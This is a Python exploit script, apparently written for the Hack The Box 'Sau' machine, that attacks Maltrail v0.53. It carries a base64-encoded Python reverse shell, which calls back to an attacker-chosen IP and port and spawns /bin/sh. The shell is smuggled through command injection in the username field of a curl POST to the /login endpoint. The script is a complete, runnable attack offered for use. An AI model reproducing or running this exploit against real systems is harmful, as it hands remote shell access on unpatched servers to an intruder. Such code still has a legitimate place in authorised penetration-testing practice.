####################################################################################################
# Author:       Seth J. Gibson
# Program:      Hummingbird
# Description:  This script sends POST request data to a server hosting RCE-vulnerable Maltrail 
#                   v0.53, set with a python3 reverse shell that will be executed once received on 
#                   the server. Written as part of my participation in the HTB Sau box. 
# Credits:      Somnath Das - https://medium.com/@dassomnath/sau-hack-the-box-write-up-7a34a6080fbf
#               spookier - https://github.com/spookier/Maltrail-v0.53-Exploit
# Theme Song:   https://www.youtube.com/watch?v=TENzstSjsus&ab_channel=MetroBoominVEVO
####################################################################################################

import sys
import os
import base64

def banner():
    print('\n    )         *      *    (       )            (   (   (      ')
    print(' ( /(       (  `   (  `   )\ ) ( /( (       (  )\ ))\ ))\ )   ')
    print(' )\())   (  )\))(  )\))( (()/( )\()))\ )  ( )\(()/(()/(()/(   ')
    print('((_)\    )\((_)()\((_)()\ /(_)|(_)\(()/(  )((_)/(_))(_))(_))  ')
    print(' _((_)_ ((_|_()((_|_()((_|_))  _((_)/(_))((_)_(_))(_))(_))_   ')
    print('| || | | | |  \/  |  \/  |_ _|| \| (_)) __| _ )_ _| _ \|   \  ')
    print('| __ | |_| | |\/| | |\/| || | | .` | | (_ | _ \| ||   /| |) | ')
    print('|_||_|\___/|_|  |_|_|  |_|___||_|\_|  \___|___/___|_|_\|___/  ')
    print('                                    by Seth Gibson            \n')

def the_magic(host_ip, host_port, target_url):
    # Python 3 Reverse shell one-liner, courtesy of pentestmonkey
    py3_payload = f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host_ip}",{host_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    
    # Base-64 encode the one-liner while it's a byte string to complete the payload
    byte_payload = base64.b64encode(py3_payload.encode()).decode()

    # Prepare a command to send post request fit with payload
    cmd = f"curl '{target_url}/login' --data 'username=;`echo+\"{byte_payload}\"+|+base64+-d+|+sh`'"

    # Send post request
    os.system(cmd)

if __name__ == '__main__':
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        target_url = sys.argv[3]
        banner()

        print('[+] Executing exploit...')
        the_magic(host_ip, host_port, target_url)

        print('\n[+] All tasks completed.')
    except IndexError:
        print('[-] Command line arguments are missing. Please try again.')
        print('[-] > python3 exploit.py <IP> <PORT> <TARGET URL>')
    except Exception as e:
        print(e)
